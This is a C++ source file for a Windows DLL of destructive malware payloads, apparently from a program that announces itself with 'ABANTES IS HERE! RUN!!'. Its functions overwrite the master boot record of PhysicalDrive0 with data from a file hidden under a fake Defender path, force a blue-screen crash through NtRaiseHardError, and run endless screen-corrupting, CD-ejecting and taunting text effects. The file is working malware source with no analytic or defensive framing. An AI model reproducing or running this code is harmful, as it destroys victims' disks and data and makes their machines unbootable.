// Payloads.cpp : Defines the exported functions for the DLL application.
//

#include "stdafx.h"
#include "Payloads.h"

#include <mmsystem.h>
#include <windowsx.h>

#pragma comment( lib, "winmm.lib" )

namespace Payloads
{
	void GetDesktopResolution(int& w, int& h) { RECT desktop; const HWND hDesktop = GetDesktopWindow(); GetWindowRect(hDesktop, &desktop); w = desktop.right; h = desktop.bottom; }

	void Payloads::MBR_Overwrite()
	{
		DWORD dw;
		LPCWSTR p = L"C:\\Windows\\Defender\\data.bin";
		HANDLE d = CreateFile(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		if (d != INVALID_HANDLE_VALUE) {
			HANDLE b = CreateFile(p, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
			if (b != INVALID_HANDLE_VALUE) {
				DWORD s = GetFileSize(b, 0);
				if (s > 0) {
					BYTE *m = new BYTE[s];
					if (ReadFile(b, m, s, &dw, 0)) {
						NULL;
						if (WriteFile(d, m, s, &dw, 0)) {
							NULL;
						}
					}
				}
			}
			CloseHandle(b);
		}
		CloseHandle(d);
		_getch();
	}

	void Payloads::FORCE_BSOD()
	{
		HMODULE ntdll = LoadLibraryA("ntdll");
		FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

		if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {

			BOOLEAN tmp1; DWORD tmp2;
			((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
			((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
		}

		ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_SYSTEM | SHTDN_REASON_MINOR_BLUESCREEN);
	}

	void Payloads::Screen_Glitching()
	{
		int t = 7500; int w = 0; int h = 0; GetDesktopResolution(w, h);

		HDC hDC = GetDC(NULL);

		while (true)
		{
			Sleep(t);
			srand(time(0));

			StretchBlt(hDC, rand() % 15 + (15), rand() % 15 + (15), w - rand() % 15 + (15), h - rand() % 15 + (15), hDC, 0, 0, w + rand() % 15 + (15), h + rand() % 15 + (15), SRCAND);
			StretchBlt(hDC, rand() % 15 + (15), rand() % 15 + (15), w - rand() % 15 + (15), h - rand() % 15 + (15), hDC, 0, 0, w + rand() % 15 + (15), h + rand() % 15 + (15), SRCPAINT);

			if (t > 750) { t -= 750; }
		}
	}

	void Payloads::Screen_Screw()
	{
		int w, h = 0; GetDesktopResolution(w, h);

		HDC hDC = GetDC(NULL);

		int cy, cx = 0;

		while (cx != w)
		{
			StretchBlt(hDC, cx, cy, 10, h, hDC, cx, cy, 10, h, DSTINVERT);
			cx++;
		}
	}

	void Payloads::Display_Icons_Error()
	{
		int w, h = 0; GetDesktopResolution(w, h);
		int ix = GetSystemMetrics(SM_CXICON); int iy = GetSystemMetrics(SM_CYICON);
		int c = 0;

		for (int r = 0; h > c;)
		{
			Sleep(0005);
			DrawIcon(GetDC(NULL), r, c, LoadIcon(NULL, IDI_QUESTION));

			r = r + iy;
			if (r == h)
			{
				c = c + ix;
				r = 0;
			}
		}
	}
	
	void Payloads::EjectCD()
	{
		MCI_OPEN_PARMS mPar = { 0 };
		mPar.lpstrDeviceType = reinterpret_cast<LPCWSTR>(MCI_DEVTYPE_CD_AUDIO);
		mciSendCommand(0, MCI_OPEN, MCI_OPEN_TYPE | MCI_OPEN_TYPE_ID, (DWORD)&mPar);
		mciSendCommand(mPar.wDeviceID, MCI_SET, MCI_SET_DOOR_OPEN, 0);
	}

	void Payloads::CursorIcon()
	{
		HINSTANCE h = LoadLibrary(L"Payloads.dll");
		if (h == NULL) { return; }

		while (true)
		{

			Sleep(0150);

			HDC hDC = GetDC(NULL);
			SetBkColor(hDC, TRANSPARENT);

			POINT c;
			GetCursorPos(&c);

			int ix = GetSystemMetrics(SM_CXICON) / 2;
			int iy = GetSystemMetrics(SM_CYICON) / 2;

			DrawIcon(hDC, GET_X_LPARAM(c.x) - ix, GET_X_LPARAM(c.y) - iy, LoadIcon(h, MAKEINTRESOURCE(IDI_ICON1)));
		}
	}

	void Payloads::CrazyBounce()
	{
		HDC hdc = GetDC(NULL);

		int w, h = 0; GetDesktopResolution(w, h);

		int x = 0;
		int y = 0;

		int ny = 15;
		int nx = 30;

		while (true) {

			Sleep(0020);

			srand(time(0));

			x = x + nx;
			y = y + ny;

			if (x >= w / 2) { nx = -30; }
			if (x < 0) { nx = 30; }
			if (y >= h / 2) { ny = -15; }
			if (y < 0) { ny = 15; }

			HBITMAP screenshot = CreateCompatibleBitmap(hdc, w, h);
			HDC hdc2 = CreateCompatibleDC(hdc);
			SelectObject(hdc2, screenshot);

			BitBlt(hdc2, 0, 0, w, h, hdc, 0, 0, SRCCOPY);

			BitBlt(hdc, x, y, w - x, h - y, hdc, -x, -y, SRCCOPY);

			BitBlt(hdc, w + x, 0, x, h, hdc2, w - x, 0, SRCCOPY);
			BitBlt(hdc, 0, h + y, w, y, hdc2, 0, h - y, SRCCOPY);

			DeleteDC(hdc2);
			DeleteObject(screenshot);
		}
	}

	void Payloads::Flip()
	{
		int w, h = 0; GetDesktopResolution(w, h);

		while (true)
		{
			Sleep(1000);

			HDC hdc = GetDC(NULL);

			StretchBlt(hdc, 0, h, w, -h, hdc, 0, 0, w, h, SRCCOPY);
		}
	}

	void Payloads::Text()
	{
		int w = 0; int h = 0; GetDesktopResolution(w, h);

		HDC hDC = GetDC(NULL);
		SetTextColor(hDC, RGB(255, 0, 0));
		SetBkColor(hDC, RGB(0, 0, 0));

		SIZE sz;
		LPCWSTR Text_Output = L"ABANTES IS HERE! RUN!! ";
		GetTextExtentPoint32(hDC, Text_Output, 24, &sz);

		int vc = -sz.cy;
		int hc = 0;

		while (hc < w)
		{
			Sleep(0002);

			TextOutW(hDC, hc, vc += sz.cy, Text_Output, 24);

			if (vc >= h)
			{
				vc = -sz.cy;
				hc += sz.cx;
			}
		}

		SIZE sze;
		GetTextExtentPoint32(hDC, L"YOUR FUCKED! <3", 16, &sze);

		int t = 0;

		while (true)
		{
			if (t % 2)
			{
				SetTextColor(hDC, RGB(0, 0, 0));
				SetBkColor(hDC, RGB(255, 0, 0));
			}
			Sleep(0150);

			TextOutW(hDC, w / 2 - sze.cx / 2, h / 2 - sze.cy / 2, L"YOUR FUCKED! <3", 16);

			SetTextColor(hDC, RGB(255, 0, 0));
			SetBkColor(hDC, RGB(0, 0, 0));

			t++;
		}
	}
}
